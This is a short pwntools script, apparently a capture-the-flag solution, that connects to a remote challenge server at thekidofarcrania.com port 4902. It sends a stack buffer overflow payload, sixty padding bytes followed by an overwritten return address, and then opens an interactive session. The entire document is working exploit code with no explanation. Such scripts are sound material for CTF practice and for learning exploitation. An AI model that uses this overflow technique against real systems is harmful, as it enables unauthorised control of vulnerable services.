from pwn import *
# p = process("./server")
p = remote('thekidofarcrania.com', 4902)

p.recvuntil("text: ")
payload = "a" * 60 + "\x86\x85\x04\x08"
p.sendline(payload)

p.interactive()
